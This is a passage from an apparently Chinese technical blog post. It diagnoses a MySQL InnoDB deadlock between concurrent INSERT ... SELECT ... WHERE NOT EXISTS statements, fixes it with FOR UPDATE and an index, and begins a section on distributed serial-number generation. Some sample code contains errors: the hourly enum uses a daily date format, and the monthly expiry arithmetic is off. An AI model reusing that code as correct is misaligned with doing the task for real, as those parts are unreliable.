com.mysql.jdbc.PreparedStatement.execute(PreparedStatement.java:1307)</span><br><span class=\"line\">\tat com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:2931)</span><br><span class=\"line\">\tat com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440)</span><br><span class=\"line\">\tat com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:2929)</span><br><span class=\"line\">\tat com.alibaba.druid.filter.FilterEventAdapter.preparedStatement_execute(FilterEventAdapter.java:440)</span><br><span class=\"line\">\tat com.alibaba.druid.filter.FilterChainImpl.preparedStatement_execute(FilterChainImpl.java:2929)</span><br><span class=\"line\">\tat com.alibaba.druid.proxy.jdbc.PreparedStatementProxyImpl.execute(PreparedStatementProxyImpl.java:131)</span><br><span class=\"line\">\tat com.alibaba.druid.pool.DruidPooledPreparedStatement.execute(DruidPooledPreparedStatement.java:493)</span><br><span class=\"line\">\tat sun.reflect.GeneratedMethodAccessor23.invoke(Unknown Source)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class=\"line\">\tat org.apache.ibatis.logging.jdbc.PreparedStatementLogger.invoke(PreparedStatementLogger.java:59)</span><br><span class=\"line\">\tat com.sun.proxy.$Proxy27.execute(Unknown Source)</span><br><span class=\"line\">\tat org.apache.ibatis.executor.statement.PreparedStatementHandler.update(PreparedStatementHandler.java:45)</span><br><span class=\"line\">\tat org.apache.ibatis.executor.statement.RoutingStatementHandler.update(RoutingStatementHandler.java:73)</span><br><span class=\"line\">\tat org.apache.ibatis.executor.SimpleExecutor.doUpdate(SimpleExecutor.java:49)</span><br><span class=\"line\">\tat org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:115)</span><br><span class=\"line\">\tat org.apache.ibatis.executor.CachingExecutor.update(CachingExecutor.java:75)</span><br><span class=\"line\">\tat org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:170)</span><br><span class=\"line\">\tat org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:157)</span><br><span class=\"line\">\tat sun.reflect.GeneratedMethodAccessor27.invoke(Unknown Source)</span><br><span class=\"line\">\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class=\"line\">\tat java.lang.reflect.Method.invoke(Method.java:497)</span><br><span class=\"line\">\tat org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:408)</span><br><span class=\"line\">\t... 15 more</span><br></pre></td></tr></table></figure>\n<p>从错误上看，出现了死锁，通过命令<code>show engine innodb status;</code>查询数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">=====================================</span><br><span class=\"line\">2018-04-01 19:17:11 700003efe000 INNODB MONITOR OUTPUT</span><br><span class=\"line\">=====================================</span><br><span class=\"line\">Per second averages calculated from the last 32 seconds</span><br><span class=\"line\">-----------------</span><br><span class=\"line\">BACKGROUND THREAD</span><br><span class=\"line\">-----------------</span><br><span class=\"line\">srv_master_thread loops: 84 srv_active, 0 srv_shutdown, 24429 srv_idle</span><br><span class=\"line\">srv_master_thread log flush and writes: 24513</span><br><span class=\"line\">----------</span><br><span class=\"line\">SEMAPHORES</span><br><span class=\"line\">----------</span><br><span class=\"line\">OS WAIT ARRAY INFO: reservation count 474</span><br><span class=\"line\">OS WAIT ARRAY INFO: signal count 548</span><br><span class=\"line\">Mutex spin waits 10228, rounds 38291, OS waits 49</span><br><span class=\"line\">RW-shared spins 1411, rounds 29858, OS waits 247</span><br><span class=\"line\">RW-excl spins 201, rounds 6233, OS waits 70</span><br><span class=\"line\">Spin rounds per wait: 3.74 mutex, 21.16 RW-shared, 31.01 RW-excl</span><br><span class=\"line\">------------------------</span><br><span class=\"line\">LATEST DETECTED DEADLOCK</span><br><span class=\"line\">------------------------</span><br><span class=\"line\">2018-04-01 19:17:02 700003fca000</span><br><span class=\"line\">*** (1) TRANSACTION:</span><br><span class=\"line\">TRANSACTION 170407, ACTIVE 0 sec setting auto-inc lock</span><br><span class=\"line\">mysql tables in use 2, locked 2</span><br><span class=\"line\">LOCK WAIT 4 lock struct(s), heap size 1184, 300 row lock(s)</span><br><span class=\"line\">MySQL thread id 2659, OS thread handle 0x700003cde000, query id 49518 localhost 127.0.0.1 root executing</span><br><span class=\"line\">INSERT INTO item (sku_code, num, status) SELECT</span><br><span class=\"line\">                                                   &#x27;K000001&#x27;,</span><br><span class=\"line\">                                                   2,</span><br><span class=\"line\">                                                   0</span><br><span class=\"line\">                                                 FROM DUAL</span><br><span class=\"line\">                                                 WHERE NOT exists(SELECT id</span><br><span class=\"line\">                                                                  FROM item</span><br><span class=\"line\">                                                                  WHERE sku_code = &#x27;K000001&#x27; AND status != 4)</span><br><span class=\"line\">*** (1) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class=\"line\">TABLE LOCK table `test`.`item` trx id 170407 lock mode AUTO-INC waiting</span><br><span class=\"line\">*** (2) TRANSACTION:</span><br><span class=\"line\">TRANSACTION 170402, ACTIVE 0 sec inserting</span><br><span class=\"line\">mysql tables in use 2, locked 2</span><br><span class=\"line\">7 lock struct(s), heap size 1184, 303 row lock(s)</span><br><span class=\"line\">MySQL thread id 2660, OS thread handle 0x700003fca000, query id 49503 localhost 127.0.0.1 root executing</span><br><span class=\"line\">INSERT INTO item (sku_code, num, status) SELECT</span><br><span class=\"line\">                                                   &#x27;K000001&#x27;,</span><br><span class=\"line\">                                                   4,</span><br><span class=\"line\">                                                   0</span><br><span class=\"line\">                                                 FROM DUAL</span><br><span class=\"line\">                                                 WHERE NOT exists(SELECT id</span><br><span class=\"line\">                                                                  FROM item</span><br><span class=\"line\">                                                                  WHERE sku_code = &#x27;K000001&#x27; AND status != 4)</span><br><span class=\"line\">*** (2) HOLDS THE LOCK(S):</span><br><span class=\"line\">TABLE LOCK table `test`.`item` trx id 170402 lock mode AUTO-INC</span><br><span class=\"line\">*** (2) WAITING FOR THIS LOCK TO BE GRANTED:</span><br><span class=\"line\">RECORD LOCKS space id 96 page no 3 n bits 368 index `PRIMARY` of table `test`.`item` trx id 170402 lock_mode X insert intention waiting</span><br><span class=\"line\">Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0</span><br><span class=\"line\"> 0: len 8; hex 73757072656d756d; asc supremum;;</span><br><span class=\"line\"></span><br><span class=\"line\">*** WE ROLL BACK TRANSACTION (1)</span><br><span class=\"line\">------------</span><br><span class=\"line\">TRANSACTIONS</span><br><span class=\"line\">------------</span><br><span class=\"line\">Trx id counter 170788</span><br><span class=\"line\">Purge done for trx&#x27;s n:o &lt; 170787 undo n:o &lt; 0 state: running but idle</span><br><span class=\"line\">History list length 1521</span><br><span class=\"line\">LIST OF TRANSACTIONS FOR EACH SESSION:</span><br><span class=\"line\">---TRANSACTION 170407, not started</span><br><span class=\"line\">MySQL thread id 2659, OS thread handle 0x700003cde000, query id 49518 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170404, not started</span><br><span class=\"line\">MySQL thread id 2661, OS thread handle 0x700003dee000, query id 49513 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170408, not started</span><br><span class=\"line\">MySQL thread id 2660, OS thread handle 0x700003fca000, query id 49546 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170296, not started</span><br><span class=\"line\">MySQL thread id 2666, OS thread handle 0x700003e76000, query id 49252 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170401, not started</span><br><span class=\"line\">MySQL thread id 2658, OS thread handle 0x700003d66000, query id 49500 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170311, not started</span><br><span class=\"line\">MySQL thread id 2667, OS thread handle 0x700003f42000, query id 49284 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170787, not started</span><br><span class=\"line\">MySQL thread id 2663, OS thread handle 0x700003d22000, query id 50365 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170403, not started</span><br><span class=\"line\">MySQL thread id 2662, OS thread handle 0x700003f86000, query id 49512 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170320, not started</span><br><span class=\"line\">MySQL thread id 2665, OS thread handle 0x700003eba000, query id 49308 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 170405, not started</span><br><span class=\"line\">MySQL thread id 2664, OS thread handle 0x700003daa000, query id 49514 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">---TRANSACTION 168759, not started</span><br><span class=\"line\">MySQL thread id 2507, OS thread handle 0x700003efe000, query id 50372 localhost 127.0.0.1 root init</span><br><span class=\"line\">show engine innodb status</span><br><span class=\"line\">---TRANSACTION 169405, not started</span><br><span class=\"line\">MySQL thread id 2498, OS thread handle 0x700003e32000, query id 46830 localhost 127.0.0.1 root cleaning up</span><br><span class=\"line\">--------</span><br><span class=\"line\">FILE I/O</span><br><span class=\"line\">--------</span><br><span class=\"line\">I/O thread 0 state: waiting for i/o request (insert buffer thread)</span><br><span class=\"line\">I/O thread 1 state: waiting for i/o request (log thread)</span><br><span class=\"line\">I/O thread 2 state: waiting for i/o request (read thread)</span><br><span class=\"line\">I/O thread 3 state: waiting for i/o request (read thread)</span><br><span class=\"line\">I/O thread 4 state: waiting for i/o request (read thread)</span><br><span class=\"line\">I/O thread 5 state: waiting for i/o request (read thread)</span><br><span class=\"line\">I/O thread 6 state: waiting for i/o request (write thread)</span><br><span class=\"line\">I/O thread 7 state: waiting for i/o request (write thread)</span><br><span class=\"line\">I/O thread 8 state: waiting for i/o request (write thread)</span><br><span class=\"line\">I/O thread 9 state: waiting for i/o request (write thread)</span><br><span class=\"line\">Pending normal aio reads: 0 [0, 0, 0, 0] , aio writes: 0 [0, 0, 0, 0] ,</span><br><span class=\"line\"> ibuf aio reads: 0, log i/o&#x27;s: 0, sync i/o&#x27;s: 0</span><br><span class=\"line\">Pending flushes (fsync) log: 0; buffer pool: 0</span><br><span class=\"line\">631 OS file reads, 5249 OS file writes, 4212 OS fsyncs</span><br><span class=\"line\">0.00 reads/s, 0 avg bytes/read, 11.03 writes/s, 7.66 fsyncs/s</span><br><span class=\"line\">-------------------------------------</span><br><span class=\"line\">INSERT BUFFER AND ADAPTIVE HASH INDEX</span><br><span class=\"line\">-------------------------------------</span><br><span class=\"line\">Ibuf: size 1, free list len 0, seg size 2, 0 merges</span><br><span class=\"line\">merged operations:</span><br><span class=\"line\"> insert 0, delete mark 0, delete 0</span><br><span class=\"line\">discarded operations:</span><br><span class=\"line\"> insert 0, delete mark 0, delete 0</span><br><span class=\"line\">Hash table size 276671, node heap has 1 buffer(s)</span><br><span class=\"line\">7.12 hash searches/s, 1.25 non-hash searches/s</span><br><span class=\"line\">---</span><br><span class=\"line\">LOG</span><br><span class=\"line\">---</span><br><span class=\"line\">Log sequence number 5988246706</span><br><span class=\"line\">Log flushed up to   5988246706</span><br><span class=\"line\">Pages flushed up to 5988246706</span><br><span class=\"line\">Last checkpoint at  5988246706</span><br><span class=\"line\">0 pending log writes, 0 pending chkp writes</span><br><span class=\"line\">3847 log i/o&#x27;s done, 7.38 log i/o&#x27;s/second</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">BUFFER POOL AND MEMORY</span><br><span class=\"line\">----------------------</span><br><span class=\"line\">Total memory allocated 137363456; in additional pool allocated 0</span><br><span class=\"line\">Dictionary memory allocated 174719</span><br><span class=\"line\">Buffer pool size   8191</span><br><span class=\"line\">Free buffers       7672</span><br><span class=\"line\">Database pages     518</span><br><span class=\"line\">Old database pages 209</span><br><span class=\"line\">Modified db pages  0</span><br><span class=\"line\">Pending reads 0</span><br><span class=\"line\">Pending writes: LRU 0, flush list 0, single page 0</span><br><span class=\"line\">Pages made young 0, not young 0</span><br><span class=\"line\">0.00 youngs/s, 0.00 non-youngs/s</span><br><span class=\"line\">Pages read 446, created 72, written 2372</span><br><span class=\"line\">0.00 reads/s, 0.03 creates/s, 9.19 writes/s</span><br><span class=\"line\">Buffer pool hit rate 1000 / 1000, young-making rate 0 / 1000 not 0 / 1000</span><br><span class=\"line\">Pages read ahead 0.00/s, evicted without access 0.00/s, Random read ahead 0.00/s</span><br><span class=\"line\">LRU len: 518, unzip_LRU len: 0</span><br><span class=\"line\">I/O sum[0]:cur[0], unzip sum[0]:cur[0]</span><br><span class=\"line\">--------------</span><br><span class=\"line\">ROW OPERATIONS</span><br><span class=\"line\">--------------</span><br><span class=\"line\">0 queries inside InnoDB, 0 queries in queue</span><br><span class=\"line\">0 read views open inside InnoDB</span><br><span class=\"line\">Main thread id 123145362894848, state: sleeping</span><br><span class=\"line\">Number of rows inserted 2531, updated 2545, deleted 2095, read 1304134</span><br><span class=\"line\">3.62 inserts/s, 3.62 updates/s, 0.00 deletes/s, 4112.25 reads/s</span><br><span class=\"line\">----------------------------</span><br><span class=\"line\">END OF INNODB MONITOR OUTPUT</span><br><span class=\"line\">============================</span><br></pre></td></tr></table></figure>\n\n<p>重现deadlock。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">INSERT INTO</span> item (sku_code, num, status) <span class=\"keyword\">SELECT</span></span><br><span class=\"line\">                                           <span class=\"string\">&#x27;K000001&#x27;</span>,</span><br><span class=\"line\">                                           <span class=\"number\">8</span>,</span><br><span class=\"line\">                                           <span class=\"number\">0</span></span><br><span class=\"line\">                                         <span class=\"keyword\">FROM</span> DUAL</span><br><span class=\"line\">                                         <span class=\"keyword\">WHERE</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">exists</span>(<span class=\"keyword\">SELECT</span> id</span><br><span class=\"line\">                                                          <span class=\"keyword\">FROM</span> item</span><br><span class=\"line\">                                                          <span class=\"keyword\">WHERE</span> sku_code <span class=\"operator\">=</span> <span class=\"string\">&#x27;K000001&#x27;</span> <span class=\"keyword\">AND</span> status <span class=\"operator\">!=</span> <span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure>\n<p>现在数据库中没有改条数据，启动3个session，设置事务不自动提交。步骤：<br>1、session1，执行sql，输入插入一条数据，但是事务未提交<br>2、seesion2，执行sql，<br>3、session3，执行sql，<br>4、session1回滚，这时就会发现session3中出现了deadlock。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy55d25kcy5jb20vP3A9MTEwOTM=\">两个INSERT发生死锁原因剖析<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>解决办法，修改SQL如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"operator\">&lt;</span><span class=\"keyword\">insert</span> id<span class=\"operator\">=</span>&quot;insertNotExist&quot; parameterType<span class=\"operator\">=</span>&quot;com.whh.pojo.Item&quot; useGeneratedKeys<span class=\"operator\">=</span>&quot;true&quot; keyProperty<span class=\"operator\">=</span>&quot;id&quot;<span class=\"operator\">&gt;</span></span><br><span class=\"line\">    <span class=\"keyword\">INSERT</span> DELAYED <span class=\"keyword\">INTO</span> item (sku_code, num, status) <span class=\"keyword\">SELECT</span></span><br><span class=\"line\">                                                #&#123;skuCode&#125;,</span><br><span class=\"line\">                                                #&#123;num&#125;,</span><br><span class=\"line\">                                                #&#123;status&#125;</span><br><span class=\"line\">                                                <span class=\"keyword\">FROM</span> DUAL</span><br><span class=\"line\">                                                <span class=\"keyword\">WHERE</span> <span class=\"keyword\">NOT</span> <span class=\"keyword\">exists</span>(<span class=\"keyword\">SELECT</span> id</span><br><span class=\"line\">                                                                <span class=\"keyword\">FROM</span> item</span><br><span class=\"line\">                                                                <span class=\"keyword\">WHERE</span> sku_code <span class=\"operator\">=</span> #&#123;skuCode&#125; <span class=\"keyword\">AND</span> status <span class=\"operator\">!=</span> <span class=\"number\">4</span> <span class=\"keyword\">for</span> <span class=\"keyword\">update</span>)</span><br><span class=\"line\"><span class=\"operator\">&lt;</span><span class=\"operator\">/</span><span class=\"keyword\">insert</span><span class=\"operator\">&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在select的后面添加<code>for update</code>，用于锁住数据，避免发生竞争导致死锁。这里通过上述启动3个事务方便执行，然后回滚的例子，并不会出现deadlock。</p>\n<ul>\n<li>此处需要添加索引，因为<code>for update</code>默认通过索引来锁数据。</li>\n</ul>\n<p>重新运行单元测试，启动正常。</p>\n<p>此处记录一个未解问题：<br>之前想优化下此处逻辑，先直接更新状态0–&gt;4，然后在插入。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Transactional()</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">createTaskImprove1</span><span class=\"params\">(String skuCode, Integer num)</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">Item</span> <span class=\"variable\">oldItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"literal\">null</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"type\">Item</span> <span class=\"variable\">newItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, <span class=\"literal\">null</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">    result = itemMapper.updateInfo(oldItem, newItem);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">Item</span> <span class=\"variable\">item</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Item</span>(skuCode, num, <span class=\"number\">0</span>);</span><br><span class=\"line\">    result = itemMapper.insertNotExist(item);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此处在并发的时候是有问题的（业务也有问题，会出现数据丢失的情况），还是会出现死锁，难道是因为使用<code>update</code>的时候数据库的锁和<code>insert ... select</code>设置的锁，导致互锁？暂时还未弄明白。</p>\n<p>解决上述问题后，又出现一个问题，当并发执行<code>insert ... select</code>时，其他线程会等待该线程事务提交后才会执行，这样就会导致效率很低。<br>通过sql</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> r.trx_isolation_level, r.trx_id waiting_trx_id,r.trx_mysql_thread_id waiting_trx_thread,</span><br><span class=\"line\">                              r.trx_state waiting_trx_state,lr.lock_mode waiting_trx_lock_mode,lr.lock_type waiting_trx_lock_type,</span><br><span class=\"line\">                              lr.lock_table waiting_trx_lock_table,lr.lock_index waiting_trx_lock_index,r.trx_query waiting_trx_query,</span><br><span class=\"line\">                              b.trx_id blocking_trx_id,b.trx_mysql_thread_id blocking_trx_thread,b.trx_state blocking_trx_state,</span><br><span class=\"line\">                              lb.lock_mode blocking_trx_lock_mode,lb.lock_type blocking_trx_lock_type,lb.lock_table blocking_trx_lock_table,</span><br><span class=\"line\">                              lb.lock_index blocking_trx_lock_index,b.trx_query blocking_query</span><br><span class=\"line\"><span class=\"keyword\">from</span> information_schema.innodb_lock_waits w <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> information_schema.innodb_trx b <span class=\"keyword\">on</span> b.trx_id<span class=\"operator\">=</span>w.blocking_trx_id</span><br><span class=\"line\">  <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> information_schema.innodb_trx r <span class=\"keyword\">on</span> r.trx_id<span class=\"operator\">=</span>w.requesting_trx_id</span><br><span class=\"line\">  <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> information_schema.innodb_locks lb <span class=\"keyword\">on</span> lb.lock_trx_id<span class=\"operator\">=</span>w.blocking_trx_id</span><br><span class=\"line\">  <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> information_schema.innodb_locks lr <span class=\"keyword\">on</span> lr.lock_trx_id<span class=\"operator\">=</span>w.requesting_trx_id</span><br></pre></td></tr></table></figure>\n<p>这样可以查询出等待的锁，可以得出锁住的是之前创建的索引。</p>\n<p>在测试的时候，因为每次都是直接删除掉数据库数据后进行操作的，这样就会出现上述的等待锁的情况。后来发现当我数据库中存在<code>K000006</code>数据时，两个事物分别插入<code>K000001</code>和<code>K000007</code>并不会出现锁等待，提交事务后数据都插入了数据库，后来实验分别插入<code>K000006</code>两边的数据，结果都未发现锁等待的情况。这里猜测应该是数据库中索引使用的是<code>B+Tree</code>结构。这时删掉之前建立的索引，都会导致锁等待。</p>\n<h3 id=\"分布式流水号\"><a href=\"#分布式流水号\" class=\"headerlink\" title=\"分布式流水号\"></a>分布式流水号</h3><p>在应用生成分布式流水号，有两种方式，一种是通过数据表生成，一种是通过缓存生成。</p>\n<h4 id=\"Mysql生成流水号\"><a href=\"#Mysql生成流水号\" class=\"headerlink\" title=\"Mysql生成流水号\"></a>Mysql生成流水号</h4><p>在原先生成分布式流水号是通过先<code>select ... for update</code>来锁定数据库中某条值，之后对该值进行更新操作，这种就会出现一个问题，如果刚刚开始数据库就没有值，并发访问时，会出现同时对数据进行插入操作。如果建立了唯一索引数据并不会出现问题。</p>\n<p>设计数据库表如下：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create table</span> test.serial_number</span><br><span class=\"line\">(</span><br><span class=\"line\">\tgroup_code <span class=\"type\">varchar</span>(<span class=\"number\">10</span>) <span class=\"keyword\">null</span> comment <span class=\"string\">&#x27;组，用于区分业务&#x27;</span>,</span><br><span class=\"line\">\tgroup_key <span class=\"type\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">not null</span> comment <span class=\"string\">&#x27;依据key生成流水号&#x27;</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">scope</span> <span class=\"type\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">not null</span> comment <span class=\"string\">&#x27;范围，如20180808表示天，2018080808表示小时&#x27;</span>,</span><br><span class=\"line\">\tsign <span class=\"type\">varchar</span>(<span class=\"number\">5</span>) <span class=\"keyword\">not null</span> comment <span class=\"string\">&#x27;重新计算标示，Y年，M月，D天，H小时，G全局&#x27;</span>,</span><br><span class=\"line\">\tnum <span class=\"type\">int</span> <span class=\"keyword\">default</span> <span class=\"string\">&#x27;0&#x27;</span> <span class=\"keyword\">not null</span> comment <span class=\"string\">&#x27;流水号&#x27;</span>,</span><br><span class=\"line\">\t<span class=\"keyword\">constraint</span> serial_number_group_code_group_key_scope_step_uindex</span><br><span class=\"line\">\t\t<span class=\"keyword\">unique</span> (group_code, group_key, <span class=\"keyword\">scope</span>, sign)</span><br><span class=\"line\">)</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n<p>创建表，同时对<code>group_code、group_key、scope、sign、num</code>建立唯一索引。<br>mapper创建db操作：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">insert</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;insertWithUpdateIncr&quot;</span>&gt;</span></span><br><span class=\"line\">    INSERT INTO serial_number (group_code, group_key, scope, sign, num)</span><br><span class=\"line\">    VALUES (#&#123;serialNumber.groupCode&#125;, #&#123;serialNumber.groupKey&#125;, #&#123;serialNumber.scope&#125;, #&#123;serialNumber.sign&#125;, #&#123;inrc&#125;)</span><br><span class=\"line\">    ON DUPLICATE KEY UPDATE num = num + #&#123;inrc&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">insert</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;selectNum&quot;</span> <span class=\"attr\">parameterType</span>=<span class=\"string\">&quot;com.whh.pojo.SerialNumber&quot;</span> <span class=\"attr\">resultType</span>=<span class=\"string\">&quot;java.lang.Integer&quot;</span>&gt;</span></span><br><span class=\"line\">    SELECT num</span><br><span class=\"line\">    FROM serial_number</span><br><span class=\"line\">            WHERE</span><br><span class=\"line\">        group_code = #&#123;groupCode&#125;</span><br><span class=\"line\">        AND group_key = #&#123;groupKey&#125;</span><br><span class=\"line\">        AND scope = #&#123;scope&#125;</span><br><span class=\"line\">        AND sign = #&#123;sign&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><code>insertWithUpdateIncr</code>用来对数据进行更新和插入操作，如果存在指定数据，那么就对数据进行更新，更新的值为传入的值为原始值+传入值，如果不存在该数据，那么对该数据进行插入操作。（数据库默认num为0，为了避免生成默认值，需要在插入时指定传入的值，可以避免数据获取失败）<br><code>selectNum</code>用于插入更新后，查询数据库最新值。</p>\n<p>创建映射对象：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">SerialNumber</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String groupCode;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String groupKey;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String scope;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> SerialSignEnum sign;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer num;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">enum</span> <span class=\"title class_\">SerialSignEnum</span> &#123;</span><br><span class=\"line\">    G(<span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">scope</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    Y(<span class=\"number\">366</span> * <span class=\"number\">24</span> * <span class=\"number\">60</span> * <span class=\"number\">60</span>) &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">scope</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyy&quot;</span>).format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    M(<span class=\"number\">32</span> * <span class=\"number\">24</span> * <span class=\"number\">60</span> * <span class=\"number\">6</span>) &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">scope</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyyMM&quot;</span>).format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    D(<span class=\"number\">24</span> * <span class=\"number\">60</span> * <span class=\"number\">60</span>) &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">scope</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyyMMdd&quot;</span>).format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    H(<span class=\"number\">60</span> * <span class=\"number\">60</span>) &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> String <span class=\"title function_\">scope</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SimpleDateFormat</span>(<span class=\"string\">&quot;yyyyMMdd&quot;</span>).format(<span class=\"keyword\">new</span> <span class=\"title class_\">Date</span>());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> Integer expire;</span><br><span class=\"line\"></span><br><span class=\"line\">    SerialSignEnum(Integer expire) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.expire = expire;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Integer <span class=\"title function_\">getExpire</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> expire;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setExpire</span><span class=\"params\">(Integer expire)</span> &#123;</span><br><span class=\"line\">        <span 